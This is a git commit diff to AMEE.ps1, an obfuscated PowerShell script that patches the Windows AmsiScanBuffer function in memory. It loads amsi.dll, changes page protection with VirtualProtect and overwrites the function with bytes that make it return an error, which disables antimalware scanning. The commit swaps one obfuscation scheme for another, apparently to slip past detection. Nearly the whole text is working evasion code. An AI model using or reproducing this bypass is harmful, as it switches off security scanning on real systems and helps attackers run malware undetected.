5df6d25512a2e3aa3eeb22f0d23a8aa768d5b055
INotGreen <89376703+INotGreen@users.noreply.github.com>
2022-05-14 15:08:11 +0800

    Update AMEE.ps1

--- AMEE.ps1
+++ AMEE.ps1
@@ -1,20 +1,10 @@
-$dcvrj = @"
-u^&*(sin^&*(g Sys^&*(t^&*(em;
-usi^&*(ng Sys^&*(tem.Runtime.Inter^&*(opSer^&*(vices;
-public class dcvrj {
-    [Dl^&*(lI@@@@@@@@@@@((((((((((((((()))))))))))))))mp^&*(ort("ker@@@@@@@@@@@((((((((((((((()))))))))))))))nel32")]
-    pu^&*(blic sta^&*(tic exte^&*(rn IntP^&*(tr GetPr^&*(ocAdd^&*(ress(Int^&*(Ptr hMo^&*(dule, st^&*(ring pro^&*(cName);
-    [D@@@@@@@@@@@((((((((((((((()))))))))))))))l^&*(lImp^&*(ort("ke^&*(rn^&*(el^&*(32")]
-    pu^&*(blic sta^&*(tic ext^&*(ern Int^&*(Ptr Load^&*(Lib^&*(rary(str^&*(ing n^&*(ame);
-    [Dl^&*(lIm@@@@@@@@@@@((((((((((((((()))))))))))))))p^&*(ort("ke^&*(rnel3^&*(2")]
-    p^&*(ub^&*(lic st^&*(at^&*(ic ex^&*(tern b^&*(ool Virt^&*(ualP@@@@@@@@@@@((((((((((((((()))))))))))))))rote@@@@@@@@@@@((((((((((((((()))))))))))))))ct(Int^&*(Ptr lpAddress, UIn@@@@@@@@@@@((((((((((((((()))))))))))))))tPtr grtylw, uint flNe@@@@@@@@@@@((((((((((((((()))))))))))))))wProtect, out ui@@@@@@@@@@@((((((((((((((()))))))))))))))nt lpfl@@@@@@@@@@@((((((((((((((()))))))))))))))OldP@@@@@@@@@@@((((((((((((((()))))))))))))))ro@@@@@@@@@@@((((((((((((((()))))))))))))))t@@@@@@@@@@@((((((((((((((()))))))))))))))ec@@@@@@@@@@@((((((((((((((()))))))))))))))t);
-}
-"@.Replace("^&*(","").Replace("@@@@@@@@@@@((((((((((((((()))))))))))))))","")
-Add-Type $dcvrj
-$xymgyyn = [dcvrj]::LoadLibrary("$(('amsi'+'.dll').NoRmalIZe([chaR]([ByTE]0x46)+[chAr](111)+[Char]([ByTE]0x72)+[chAr]([byte]0x6d)+[cHaR]([Byte]0x44)) -replace [cHAR](92*1/1)+[ChAr](112)+[CHaR](123)+[chAr](77)+[ChAr]([ByTe]0x6e)+[cHaR]([bYTe]0x7d))")
-$ppruhu = [dcvrj]::GetProcAddress($xymgyyn, "$([CHar]([BYte]0x41)+[cHAr]([Byte]0x6d)+[chAr](115+85-85)+[Char](105)+[ChaR](83+56-56)+[ChAr](99+13-13)+[CHar](97+59-59)+[ChAR]([byTE]0x6e)+[chAR]([BYTe]0x42)+[Char]([bYte]0x75)+[cHAR](44+58)+[ChAr]([BYte]0x66)+[CHaR]([bYTe]0x65)+[CHAR](114*92/92))")
-$p = 0
-[dcvrj]::VirtualProtect($ppruhu, [uint32]5, 0x40, [ref]$p)
+
+${_/==\_/\__/===\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwANAAoAfQA=')))
+Add-Type ${_/==\_/\__/===\_/}
+${__/=\/==\/\_/=\_/} = [Win32]::LoadLibrary("am" + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAC4AZABsAGwA'))))
+${___/====\__/=====} = [Win32]::GetProcAddress(${__/=\/==\/\_/=\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGEAbgA='))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))))
+${/==\_/=\/\__/\/\/} = 0
+[Win32]::VirtualProtect(${___/====\__/=====}, [uint32]5, 0x40, [ref]${/==\_/=\/\__/\/\/})
 $junr = "0xB8"
 $ccwg = "0x57"
 $boxa = "0x00"
@@ -22,5 +12,6 @@ $mcet = "0x07"
 $tfwz = "0x80"
 $dufv = "0xC3"
 $scnfh = [Byte[]] ($junr,$ccwg,$boxa,$mcet,+$tfwz,+$dufv)
-$string1 = '[S#$%^&*ystem.R#$%^&*untime.I#$%^&*nteropServi#$%^&*ces.Marshal]::#$%^&*Copy($sc#$%^&*nfh, 0, $pp#$%^&*ruhu#$%^&*, #$%^&*6)'.Replace('#$%^&*','')
-iex $string1
+
+ .('Sv')  ("5H"+"3VT") (  [TyPE]("{4}{7}{3}{0}{8}{10}{5}{1}{9}{2}{6}" -f'Nt','eRoP','s.','teM.Ru','s','t','marsHal','YS','iMe.I','sErviCE','n'));  (.("{0}{1}" -f'gc','I') ("V"+"arIA"+"Bl"+"e:5h3V"+"t") )."V`ALue"::("{1}{0}"-f 'y','Cop')($scnfh, 0, ${___/====\__/=====}, 6)
+
